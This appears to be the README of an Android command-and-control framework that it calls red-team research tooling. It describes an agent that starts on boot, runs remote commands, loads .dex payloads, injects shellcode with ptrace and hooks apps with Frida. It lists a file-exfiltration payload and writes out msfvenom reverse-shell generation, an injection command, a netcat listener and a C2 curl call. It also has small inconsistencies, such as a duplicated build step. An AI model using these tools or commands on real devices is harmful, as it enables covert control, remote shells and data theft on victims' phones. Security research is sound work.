# MobileMorphAgent

**MobileMorphAgent** is a modular Command and Control (C2) research framework for Android devices. It enables remote execution of OS-level commands, dynamic code injection via `.dex` payloads, native binary injection via `ptrace`, and Frida-based hooking — making it ideal for red team operations, malware research, or mobile dynamic analysis.

---

## LEGAL DISCLAIMER

> This tool is intended **solely for research and authorized security testing** purposes. Any use on unauthorized systems or devices is strictly prohibited and likely illegal.  
>  
> By using this tool, you agree to take **full responsibility** for your actions. The authors assume **no liability** for misuse.

---

## Features

### 🔧 Android Agent (APK)
- Runs as a background service on boot
- Executes commands from the C2 server via `Runtime.getRuntime().exec()`
- Loads `.dex` payloads dynamically using `DexClassLoader`
- Can be extended to run Frida hooks or native injections

### Native Injector
- `injector.c` uses `ptrace` to attach to other processes
- Shellcode injection via memory mapping (to be expanded)

### Dynamic Payloads
- Modular `.dex` payloads like `Payload.java` compiled outside the APK
- Uploaded and loaded dynamically at runtime

### Flask C2 Server
- REST API for:
  - Registering new agents
  - Sending commands
  - Receiving agent output
  - Updating command queue

---

## Project Structure

```plaintext
MobileMorphAgent/
├── .github/workflows
│   ├── codeql.yml
|
├── android_agent/           # Android APK (agent)
│   ├── app/
│   │   ├── src/main/
│   │   |   ├── java/
│   │   |   |   ├── com/mobilemorph/agent/
|   |   |   |   |   ├── AgentUpdateManager.java
|   |   |   |   |   ├── MainActivity.java
|   |   |   |   |   ├── ReconModule.java
|   |   |   |   |   ├── StealthSettingsActivity.java
|   |   |   |   |   ├── UpdateChecker.java
│   │   |   |   |   ├── frida/           # FridaHookManager.kt
│   │   |   |   |   ├── jobs/            # AgentWorker.java
│   │   |   |   |   ├── services/        # CommandService.java
│   │   |   |   |   ├── receiver/        # BootReceiver.java
│   │   |   |   |   └── util/            # ShellExecutor.java, DexLoader.java, EncryptedDexLoader.java, NetworkUtils.java, PayloadUpdater.java
│   │   |   |   ├── res/layout           # activity_main.xml, activity_stealth_settings.xml
│   │   |   |   ├── res/xml              # network_security.xml
|   |   |   └── AndroidManifest.xml
|   |   └── build.gradle
|   ├── gradle/wrapper
|   ├── build.gradle
|   ├── gradlew
|   ├── gradlew.bat
│   └── settings.gradle
|
├── core/                    # replacement for Drozer (DYNA integration)
│   ├── __init__.py
│   ├── agent_helper.py
│   ├── analyzer.py
│   ├── apk_ctx.py
│   ├── drozer_helper.py
│   ├── mobilemorph_agent.py
│   └── report_generator.py
|
├── frida_hooks/             # Optional Frida hook scripts
│   ├── bypass_ssl.js
│   ├── dynamic_reflection.js
│   ├── intent_injection.js
│   └── network_logger.js
│
├── injector/                # Native binary injector (C)
│   ├── injector.c
│   └── Makefile
│
├── morph_server/server/                  # Flask-based C2 backend
│   ├── injector.c
│   |    ├── main.py
│   |   ├── token_utils.py
│   |   └── requirements.txt
│
├── payloads/                # Runtime .dex payloads (copied to device)
│   └── test_payload.dex
│
├── payloads_source/         # Source .java files for payloads
│   ├── Payload_AppScanner.java
│   ├── Payload_ContentDump.java
│   ├── Payload_FileExfil.java
│   └── Payload.java
│
├── scripts/                 # Helper build scripts
│   ├── build_all_payloads.sh
│   ├── build_and_deploy.sh
│   ├── build_payload_appscanner.sh
│   └── build_payload.sh
│
├── LICENSE
├── README.md
├── ROADMAP.md
└── .gitignore
```

## Getting Started

### Prerequisites

- Android SDK + `d8` (build-tools)
- Python 3.x + Flask
- ADB installed
- Android device or emulator (rooted recommended for native injection)

---

### 1. Build the Android Agent

From `android_agent/`:

```bash
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

### 1. Build the Android Agent

From `android_agent/`:

```bash
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/mmagent.apk
```

### 2. Run the Flask C2 Server
```bash
cd server/
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```
Default server URL: `http://localhost:5000`

### 3. Build and Deploy a Payload
```bash
chmod +x scripts/build_payload.sh
./scripts/build_payload.sh

adb push payloads/test_payload.dex /sdcard/MobileMorphAgent/payloads
```

### 4. Test Command Execution/Dex Injection

Via curl or Postman:

```bash
curl -X POST http://localhost:5000/set_command -H "Content-Type: application/json" -d '{"device_id": "android123", "command": "dexload"}'
```
The agent will receive the command and invoke:
```java
DexLoader.loadandExecute(context, "/sdcard/MobileMorphAgent/payloads/test_payload.dex");
```

---

## Native Injection Usage (`injector.c`)

`injector.c` enables low-level shellcode injection into running processes using `ptrace`. It supports both `x86_64` and `arm64` architectures.

### Build the Injector

```bash
# x86_64 (Linux)
gcc injector/injector.c -o injector/injector

# ARM64 (Android target using NDK or Termux)
aarch64-linux-android-gcc injector/injector.c -o injector/injector
```

### Generate Shellcode Payload
Use `msfvenom` to create a reverse shell payload:

```bash
# x86_64 (Linux)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o reverse_shell.bin

# ARM64 (Android target using NDK or Termux)
msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o reverse_shell.bin
```

### Inject the Shellcode
```bash
# Replace <PID> with the target process ID (e.g., from `ps`)
./injector/injector <PID> reverse_shell.bin
```
- This injector will:
  1. Attach to the target process
  2. Use remote `mmap()` to allocate memory
  3. Write the shellcode
  4. Redirect the PC to execute the payload

### Start the Listener
Set up your reverse shell listener before injection:
```bash
# x86_64 (Linux)
nc -lnvp 4444
```
Once the shellcode executes, it will connect back to your terminal.

...

## 👥 Credits

Created by **[Your Name or Team]** — 2025

Inspired by:
- [Drozer](https://github.com/FSecureLABS/drozer)
- [Frida](https://frida.re)
- [Metasploit Android payloads](https://github.com/rapid7/metasploit-framework)

---

## 🛡️ License

This project is licensed under the [MIT License](LICENSE).